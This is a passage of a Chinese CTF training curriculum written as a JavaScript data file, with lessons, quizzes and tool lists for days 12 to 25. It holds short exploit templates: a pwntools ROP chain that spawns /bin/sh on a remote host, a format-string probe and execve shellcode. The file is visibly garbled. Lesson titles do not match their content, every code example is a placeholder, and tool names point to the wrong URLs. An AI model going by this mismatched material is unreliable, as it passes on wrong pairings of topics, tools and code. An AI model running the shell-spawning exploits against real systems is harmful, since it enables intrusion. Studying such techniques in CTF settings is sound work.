    content: '# CTF PWN进阶技巧\n\n**1. ROP链**\n```python\nfrom pwn import *\np = remote(host, port)\nrop = ROP(\'./binary\')\nrop.call(\'system\', [next(rop.search(\'/bin/sh\'))])\npayload = b\'A\'*0x40 + rop.chain()\np.sendline(payload)\np.interactive()\n```\n\n**2. 格式化字符串攻击**\n```python\npayload = b\'%p%p%p%p\'\np.sendline(payload)\n```\n\n**3. 堆漏洞**\n- Use-After-Free\n- Double Free\n- Fastbin Attack\n- Tcache Poisoning\n\n**4. Shellcode**\n```nasm\nxor rdi, rdi\nmov rsi, 0x68732f6e69622f\npush rsi\nmov rdi, rsp\nmov rax, 59\nsyscall\n```',
    quiz: [q('ROP链攻击的目的是什么？',['加密数据','绕过NX保护执行代码','格式化输出','压缩文件'],1,'ROP链用于绕过NX保护执行代码'),q('堆漏洞中Double Free是什么？',['双重释放同一个堆块','释放后继续使用','快速释放','缓存释放'],0,'Double Free是指两次释放同一个堆块')],
    codeExamples: [{ title: 'Burp组合拳训练示例代码', language: 'python', code: '# Burp组合拳训练 - Day 12\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'Burp组合拳训练核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'Burp组合拳训练核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'Burp组合拳训练辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'Burp组合拳训练常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Burp组合拳训练实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Burp组合拳训练相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Burp组合拳训练的基本解题方法' }],
    resources: [
      { name: 'Burp组合拳训练学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Burp组合拳训练实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Burp组合拳训练专家', title: 'Burp组合拳训练学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r13', day: 13, title: 'Burp专项闯关',
    subtitle: 'Burp实战·快捷键',
    objectives: ['掌握Crypto高级题目'],
    keyPoints: ['RSA攻击','AES攻击','哈希攻击','侧信道'],
    content: '# CTF Crypto进阶技巧\n\n**1. RSA攻击**\n- 小指数攻击(e=3)\n- 共模攻击(相同n不同e)\n- 低加密指数广播攻击\n- CRT攻击\n\n```python\nfrom Crypto.Util.number import *\nc = ...\ne = 3\nm = integer_root(c, e)\nprint(long_to_bytes(m))\n```\n\n**2. AES攻击**\n- ECB模式：相同明文相同密文\n- CBC模式：IV攻击\n- GCM模式：非ce认证攻击\n- Padding Oracle\n\n**3. 哈希攻击**\n- MD5/SHA1碰撞\n- 长度扩展攻击\n- 哈希截断\n\n**4. 侧信道攻击**\n- 计时攻击\n- 差分功耗分析(DPA)\n- 电磁分析(EMA)',
    quiz: [q('RSA小指数攻击(e=3)的原理是什么？',['分解大质数','直接开方解密','暴力破解私钥','利用共模'],1,'小指数攻击中可以直接对密文开方得到明文'),q('AES ECB模式的弱点是什么？',['加密速度慢','相同明文产生相同密文','密钥长度短','无法解密'],1,'ECB模式相同明文产生相同密文，易被攻击')],
    codeExamples: [{ title: 'Burp专项闯关示例代码', language: 'python', code: '# Burp专项闯关 - Day 13\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'Burp专项闯关核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'Burp专项闯关核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'Burp专项闯关辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'Burp专项闯关常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Burp专项闯关实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Burp专项闯关相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Burp专项闯关的基本解题方法' }],
    resources: [
      { name: 'Burp专项闯关学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Burp专项闯关实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Burp专项闯关专家', title: 'Burp专项闯关学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r14', day: 14, title: '第一、二周总复盘',
    subtitle: 'Burp四大模块总复习',
    objectives: ['掌握Reverse高级题目'],
    keyPoints: ['反混淆','VM保护','代码虚拟化','Frida'],
    content: '# CTF Reverse进阶技巧\n\n**1. 反混淆**\n- 花指令去除\n- 控制流平坦化\n- OLLVM保护\n- VMProtect\n\n**2. Frida动态插桩**\n```javascript\nInterceptor.attach(ptr("0xdeadbeef"), {\n    onEnter: function(args) {\n        console.log("Arg0:", args[0].toInt32());\n    },\n    onLeave: function(retval) {\n        console.log("Ret:", retval.toInt32());\n    }\n});\n```\n\n**3. 代码虚拟化**\n- VMProtect\n- Themida\n- Enigma Protector\n\n**4. Android逆向**\n- APK反编译\n- dex2jar\n- jadx-gui\n- Frida Android',
    quiz: [q('Frida主要用于什么？',['静态分析','动态插桩','反编译','加密'],1,'Frida是一款强大的动态插桩工具'),q('OLLVM是什么？',['调试器','混淆工具','反汇编器','虚拟机'],1,'OLLVM是一种代码混淆工具')],
    codeExamples: [{ title: '第一、二周总复盘示例代码', language: 'python', code: '# 第一、二周总复盘 - Day 14\n# CTF web方向实战\nprint("CTF web实战")', explanation: '第一、二周总复盘核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '第一、二周总复盘核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '第一、二周总复盘辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '第一、二周总复盘常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '第一、二周总复盘实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择第一、二周总复盘相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握第一、二周总复盘的基本解题方法' }],
    resources: [
      { name: '第一、二周总复盘学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '第一、二周总复盘实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '第一、二周总复盘专家', title: '第一、二周总复盘学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r15', day: 15, title: '数字型与闭合方式',
    subtitle: 'SQL注入·数字型字符型',
    objectives: ['掌握Misc高级题目'],
    keyPoints: ['隐写术','流量分析','取证','编码'],
    content: '# CTF Misc进阶技巧\n\n**1. 隐写术**\n- LSB隐写：最低有效位\n- Steghide：图像隐写\n- Exiftool：元数据\n- 音频频谱分析\n\n**2. 流量分析**\n- DNS隧道数据提取\n- HTTP隐藏数据\n- TLS解密(需要密钥)\n- 协议分析\n\n**3. 取证**\n- 文件雕刻：恢复删除文件\n- 内存分析：volatility\n- 注册表分析：SAM哈希提取\n- 日志分析：事件日志\n\n**4. 编码**\n- Brainfuck\n- Whitespace\n- 摩尔斯电码\n- 培根密码\n\n**5. 压缩包**\n- ZIP密码破解\n- RAR密码破解\n- 伪加密\n- 隐藏文件',
    quiz: [q('volatility工具用于什么？',['图片隐写','内存取证','流量分析','压缩包破解'],1,'volatility是用于内存取证分析的工具'),q('Steghide是什么？',['音频分析工具','图像隐写工具','文件恢复工具','日志分析工具'],1,'Steghide是一款图像隐写工具')],
    codeExamples: [{ title: '数字型与闭合方式示例代码', language: 'python', code: '# 数字型与闭合方式 - Day 15\n# CTF web方向实战\nprint("CTF web实战")', explanation: '数字型与闭合方式核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '数字型与闭合方式核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '数字型与闭合方式辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '数字型与闭合方式常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '数字型与闭合方式实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择数字型与闭合方式相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握数字型与闭合方式的基本解题方法' }],
    resources: [
      { name: '数字型与闭合方式学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '数字型与闭合方式实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '数字型与闭合方式专家', title: '数字型与闭合方式学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r16', day: 16, title: 'order by判列数',
    subtitle: 'SQL注入·列数探测',
    objectives: ['掌握竞赛实战技巧'],
    keyPoints: ['时间管理','题目选择','心态','工具准备'],
    content: '# CTF实战技巧\n\n**1. 时间管理**\n- 比赛开始先浏览所有题目\n- 简单题快速解决拿分\n- 难题限时(30-60分钟)\n- 留最后30分钟检查提交\n\n**2. 题目选择**\n- 按分值排序，先做高分题\n- 看题解人数，选多人解出的题\n- 团队分工，每人专注1-2个方向\n\n**3. 心态调整**\n- 不要被难题困住\n- 队友之间互相鼓励\n- 保持冷静，仔细分析\n- 享受比赛过程\n\n**4. 工具准备**\n- 常用脚本模板\n- 字典文件(rockyou.txt等)\n- 虚拟机快照\n- 网络代理',
    quiz: [q('CTF比赛中应该如何选择题目？',['按难度排序','按分值排序','随机选择','按名字排序'],1,'应该按分值排序，先做高分题'),q('比赛中难题应该花费多长时间？',['无限时间','10分钟','30-60分钟','5分钟'],2,'难题应该限时30-60分钟')],
    codeExamples: [{ title: 'order by判列数示例代码', language: 'python', code: '# order by判列数 - Day 16\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'order by判列数核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'order by判列数核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'order by判列数辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'order by判列数常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'order by判列数实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择order by判列数相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握order by判列数的基本解题方法' }],
    resources: [
      { name: 'order by判列数学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'order by判列数实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'order by判列数专家', title: 'order by判列数学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r17', day: 17, title: 'union select联合查询',
    subtitle: 'SQL注入·联合查询',
    objectives: ['掌握赛后总结方法'],
    keyPoints: ['复盘','学习','记录','分享'],
    content: '# CTF赛后总结\n\n**1. 复盘流程**\n- 回顾比赛过程\n- 分析做对的题目\n- 总结做错的题目\n- 评估团队表现\n\n**2. 学习题解**\n- 查看官方题解\n- 阅读WriteUp\n- 学习新技巧\n- 补充知识盲区\n\n**3. 记录笔记**\n- 题目类型\n- 解题思路\n- 关键代码\n- 工具用法\n\n**4. 分享交流**\n- 团队内部分享\n- 写博客记录\n- 参加CTF社区讨论\n- 帮助新手入门',
    quiz: [q('CTF赛后总结的目的是什么？',['炫耀成绩','巩固知识提升能力','浪费时间','记录分数'],1,'赛后总结是为了巩固知识提升能力'),q('WriteUp是什么？',['比赛计分板','解题思路记录','工具名称','队伍名称'],1,'WriteUp是解题思路记录')],
    codeExamples: [{ title: 'union select联合查询示例代码', language: 'python', code: '# union select联合查询 - Day 17\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'union select联合查询核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'union select联合查询核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'union select联合查询辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'union select联合查询常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'union select联合查询实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择union select联合查询相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握union select联合查询的基本解题方法' }],
    resources: [
      { name: 'union select联合查询学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'union select联合查询实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'union select联合查询专家', title: 'union select联合查询学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r18', day: 18, title: 'information_schema实战',
    subtitle: 'SQL注入·系统库查表',
    objectives: ['了解国内外CTF竞赛'],
    keyPoints: ['国内竞赛','国际竞赛','高校竞赛'],
    content: '# CTF竞赛推荐\n\n**国内竞赛：**\n1. CTFHub公开赛\n2. 强网杯\n3. XCTF联赛\n4. ISCC\n\n**国际竞赛：**\n1. DEF CON CTF\n2. HackTheBox\n3. TryHackMe\n\n**高校竞赛：**\n1. ByteCTF\n2. XNUCA\n3. TCTF',
    quiz: [q('DEF CON CTF是什么类型的竞赛？',['国内竞赛','国际竞赛','高校竞赛','地区竞赛'],1,'DEF CON CTF是国际顶级CTF竞赛'),q('XNUCA是什么竞赛？',['国内竞赛','国际竞赛','高校竞赛','企业竞赛'],2,'XNUCA是高校CTF竞赛')],
    codeExamples: [{ title: 'information_schema实战示例代码', language: 'python', code: '# information_schema实战 - Day 18\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'information_schema实战核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'information_schema实战核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'information_schema实战辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'information_schema实战常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'information_schema实战实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择information_schema实战相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握information_schema实战的基本解题方法' }],
    resources: [
      { name: 'information_schema实战学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'information_schema实战实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'information_schema实战专家', title: 'information_schema实战学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r19', day: 19, title: '爆表名和字段名',
    subtitle: 'SQL注入·表名列名提取',
    objectives: ['了解CTF学习资源'],
    keyPoints: ['书籍','网站','博客','视频'],
    content: '# CTF学习资源\n\n**书籍：**\n1. 《CTF竞赛权威指南》\n2. 《Web安全深度剖析》\n3. 《二进制安全》\n4. 《密码学基础》\n\n**网站：**\n1. CTFtime：https://ctftime.org\n2. CTFHub：https://www.ctfhub.com\n3. BUUCTF：https://buuoj.cn\n4. 攻防世界：https://adworld.xctf.org.cn\n\n**工具：**\n1. pwntools\n2. IDA Pro/Ghidra\n3. Wireshark\n4. hashcat\n5. John the Ripper',
    quiz: [q('CTFtime网站的主要作用是什么？',['刷题平台','赛事日历','工具下载','论坛交流'],1,'CTFtime是赛事日历网站'),q('Ghidra是什么工具？',['调试器','反汇编器','加密工具','Web扫描器'],1,'Ghidra是开源反汇编器')],
    codeExamples: [{ title: '爆表名和字段名示例代码', language: 'python', code: '# 爆表名和字段名 - Day 19\n# CTF web方向实战\nprint("CTF web实战")', explanation: '爆表名和字段名核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '爆表名和字段名核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '爆表名和字段名辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '爆表名和字段名常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '爆表名和字段名实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择爆表名和字段名相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握爆表名和字段名的基本解题方法' }],
    resources: [
      { name: '爆表名和字段名学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '爆表名和字段名实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '爆表名和字段名专家', title: '爆表名和字段名学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r20', day: 20, title: '报错注入',
    subtitle: 'SQL注入·updatexml报错',
    objectives: ['了解CTF相关面试问题'],
    keyPoints: ['面试问题','项目经验','技能展示','证书'],
    content: '# CTF面试准备\n\n**常见面试问题：**\n1. "你参加过哪些CTF比赛？"\n2. "你在CTF中擅长什么方向？"\n3. "讲一个你印象最深的CTF题目？"\n4. "CTF经历对你的安全能力有什么帮助？"\n\n**项目经验：**\n- 参加的竞赛名称\n- 获得的成绩\n- 解决的典型题目\n- 团队角色\n\n**证书推荐：**\n- OSCP(渗透测试)\n- CEH(认证道德黑客)\n- CISP(国内安全)\n- CISSP(信息安全专家)',
    quiz: [q('OSCP是什么证书？',['网络安全','渗透测试','软件开发','项目管理'],1,'OSCP是渗透测试认证'),q('面试中如何展示CTF经验？',['只说参加过比赛','详细讲解题思路','展示获得的成绩','以上都对'],3,'应该详细讲解题思路并展示成绩')],
    codeExamples: [{ title: '报错注入示例代码', language: 'python', code: '# 报错注入 - Day 20\n# CTF web方向实战\nprint("CTF web实战")', explanation: '报错注入核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '报错注入核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '报错注入辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '报错注入常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '报错注入实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择报错注入相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握报错注入的基本解题方法' }],
    resources: [
      { name: '报错注入学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '报错注入实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '报错注入专家', title: '报错注入学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r21', day: 21, title: '盲注突破',
    subtitle: 'SQL注入·布尔盲注·时间盲注',
    objectives: ['实战练习CTF题目'],
    keyPoints: ['刷题','总结','提升'],
    content: '# CTF题库实战\n\n**刷题计划：**\n- 每天刷3-5道题\n- 按题型分类刷\n- 记录解题时间\n- 总结解题思路\n\n**推荐题目：**\n1. CTFHub入门题\n2. BUUCTF新手题\n3. 攻防世界新手区\n4. HackTheBox免费靶机\n\n**提升方法：**\n1. 看题解学习新技巧\n2. 编写自动化脚本\n3. 总结解题套路\n4. 组队刷题交流',
    quiz: [q('CTF刷题应该注意什么？',['只看数量','注重质量','不做总结','随机刷题'],1,'刷题应该注重质量'),q('刷题后的总结应该包含什么？',['题目类型','解题思路','关键代码','以上都对'],3,'总结应该包含题目类型、解题思路和关键代码')],
    codeExamples: [{ title: '盲注突破示例代码', language: 'python', code: '# 盲注突破 - Day 21\n# CTF web方向实战\nprint("CTF web实战")', explanation: '盲注突破核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '盲注突破核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '盲注突破辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '盲注突破常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '盲注突破实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择盲注突破相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握盲注突破的基本解题方法' }],
    resources: [
      { name: '盲注突破学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '盲注突破实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '盲注突破专家', title: '盲注突破学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r22', day: 22, title: '第三周复盘',
    subtitle: 'SQL注入总复习',
    objectives: ['开发CTF辅助工具'],
    keyPoints: ['脚本','工具','自动化'],
    content: '# CTF自动化工具开发\n\n**常用脚本：**\n1. SQL注入自动化\n2. 端口扫描器\n3. 编码解码工具\n4. 哈希破解工具\n\n**开发示例：**\n```python\nimport base64\ndef encode_base64(text):\n    return base64.b64encode(text.encode()).decode()\ndef decode_base64(text):\n    return base64.b64decode(text).decode()\n```\n\n**工具框架：**\n- Flask/Django：Web界面\n- PyQt：桌面端\n- CLI：命令行工具',
    quiz: [q('CTF自动化工具的作用是什么？',['美化界面','提高解题效率','编写文档','打印报告'],1,'自动化工具可以提高解题效率'),q('常用的CTF自动化脚本有哪些？',['SQL注入脚本','端口扫描器','编码解码工具','以上都对'],3,'这些都是常用的CTF自动化脚本')],
    codeExamples: [{ title: '第三周复盘示例代码', language: 'python', code: '# 第三周复盘 - Day 22\n# CTF web方向实战\nprint("CTF web实战")', explanation: '第三周复盘核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '第三周复盘核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '第三周复盘辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '第三周复盘常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '第三周复盘实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择第三周复盘相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握第三周复盘的基本解题方法' }],
    resources: [
      { name: '第三周复盘学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '第三周复盘实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '第三周复盘专家', title: '第三周复盘学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r23', day: 23, title: 'LFI本地包含',
    subtitle: '文件包含·路径遍历',
    objectives: ['掌握比赛策略'],
    keyPoints: ['赛前准备','赛中策略','赛后复盘'],
    content: '# CTF比赛策略\n\n**赛前准备：**\n1. 团队分工明确\n2. 工具准备齐全\n3. 脚本模板整理\n4. 心态调整\n\n**赛中策略：**\n1. 快速浏览题目\n2. 先做简单题\n3. 合理分配时间\n4. 团队沟通顺畅\n\n**赛后复盘：**\n1. 总结经验教训\n2. 学习新技巧\n3. 改进团队协作\n4. 准备下次比赛',
    quiz: [q('比赛开始应该先做什么？',['直接做难题','快速浏览所有题目','讨论分工','吃饭休息'],1,'应该先快速浏览所有题目'),q('赛后复盘的目的是什么？',['庆祝胜利','总结经验教训','抱怨题目难','忘记比赛'],1,'赛后复盘是为了总结经验教训')],
    codeExamples: [{ title: 'LFI本地包含示例代码', language: 'python', code: '# LFI本地包含 - Day 23\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'LFI本地包含核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'LFI本地包含核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'LFI本地包含辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'LFI本地包含常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'LFI本地包含实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择LFI本地包含相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握LFI本地包含的基本解题方法' }],
    resources: [
      { name: 'LFI本地包含学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'LFI本地包含实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'LFI本地包含专家', title: 'LFI本地包含学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r24', day: 24, title: '伪协议进阶',
    subtitle: '文件包含·php伪协议',
    objectives: ['避免常见错误'],
    keyPoints: ['坑点','注意事项','避坑技巧'],
    content: '# CTF常见坑点\n\n**1. 编码问题**\n- 中文编码(GBK/UTF-8)\n- URL编码\n- Base64编码\n\n**2. 时间问题**\n- 超时限制\n- 服务器时区\n- 时间戳转换\n\n**3. 格式问题**\n- Flag格式(flag{xxx})\n- 大小写敏感\n- 空格问题\n\n**4. 网络问题**\n- 延迟\n- 断连\n- 代理配置\n\n**5. 工具问题**\n- 版本兼容\n- 依赖缺失\n- 环境配置',
    quiz: [q('CTF中常见的编码问题有哪些？',['中文编码','URL编码','Base64编码','以上都对'],3,'这些都是常见的编码问题'),q('Flag格式通常是什么样的？',['flag{xxx}','FLAG{xxx}','{flag}xxx','xxx[flag]'],0,'标准flag格式为flag{xxx}')],
    codeExamples: [{ title: '伪协议进阶示例代码', language: 'python', code: '# 伪协议进阶 - Day 24\n# CTF web方向实战\nprint("CTF web实战")', explanation: '伪协议进阶核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '伪协议进阶核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '伪协议进阶辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '伪协议进阶常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '伪协议进阶实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择伪协议进阶相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握伪协议进阶的基本解题方法' }],
    resources: [
      { name: '伪协议进阶学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '伪协议进阶实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '伪协议进阶专家', title: '伪协议进阶学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r25', day: 25, title: '路径绕过与编码绕过',
    subtitle: '文件包含·WAF绕过',
    objectives: ['制定进阶学习路线'],
    keyPoints: ['学习路线','目标','计划'],
